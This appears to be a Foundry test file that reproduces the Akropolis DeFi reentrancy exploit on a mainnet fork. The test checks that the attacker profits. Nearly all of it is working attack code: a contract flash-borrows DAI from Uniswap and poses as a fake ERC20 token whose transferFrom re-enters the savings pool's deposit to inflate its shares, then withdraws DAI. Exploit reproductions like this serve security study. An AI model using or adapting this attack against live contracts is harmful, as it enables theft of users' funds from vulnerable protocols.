// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost: ~$2M
// Attack TX: https://etherscan.io/tx/0x270836213a621d9f43159439065ddeb54cb9a69fec07fbb63d7f22edd9be5103
// @Info - A fake ERC20 reentered deposit() from transferFrom() and inflated pool shares.

interface IAkropolisSavings {
    function deposit(
        address protocol,
        address[] calldata tokens,
        uint256[] calldata amounts
    ) external returns (uint256);
    function withdraw(
        address protocol,
        address token,
        uint256 amount,
        uint256 minAmount
    ) external returns (uint256);
    function poolTokenByProtocol(
        address protocol
    ) external view returns (address);
}

contract AkropolisExploitTest is Test {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.public.blastapi.io", 11_242_639);
    }

    function testExploit() public {
        AkropolisAttacker attacker = new AkropolisAttacker();
        uint256 balanceBefore = DAI.balanceOf(address(attacker));

        attacker.attack();

        assertGt(DAI.balanceOf(address(attacker)), balanceBefore, "attacker did not profit");
    }
}

contract AkropolisAttacker {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IUniswapV2Pair private constant DAI_WETH_PAIR = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    IAkropolisSavings private constant SAVINGS = IAkropolisSavings(0x73fC3038B4cD8FfD07482b92a52Ea806505e5748);
    address private constant DELPHI = 0x7967adA2A32A633d5C055e2e075A83023B632B4e;

    uint256 private constant FLASH_AMOUNT = 1_000_000 ether;
    bool private reentering;

    function attack() external {
        DAI_WETH_PAIR.swap(FLASH_AMOUNT, 0, address(this), hex"01");
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(DAI_WETH_PAIR), "not pair");
        DAI.approve(address(SAVINGS), type(uint256).max);

        address[] memory tokens = new address[](1);
        tokens[0] = address(this);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 5_000_000;
        SAVINGS.deposit(DELPHI, tokens, amounts);

        IERC20 poolToken = IERC20(SAVINGS.poolTokenByProtocol(DELPHI));
        SAVINGS.withdraw(DELPHI, address(DAI), poolToken.balanceOf(address(this)) * 99 / 100, 0);

        DAI.transfer(address(DAI_WETH_PAIR), (FLASH_AMOUNT * 1000) / 997 + 1);
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool) {
        if (!reentering) {
            reentering = true;
            address[] memory tokens = new address[](1);
            tokens[0] = address(DAI);
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = 24_749 ether;
            SAVINGS.deposit(DELPHI, tokens, amounts);
            DAI.transfer(DELPHI, 1 ether);
            reentering = false;
        }
        return true;
    }

    function balanceOf(
        address
    ) external pure returns (uint256) {
        return type(uint256).max;
    }

    function decimals() external pure returns (uint8) {
        return 6;
    }

    function transfer(
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function approve(
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }
}
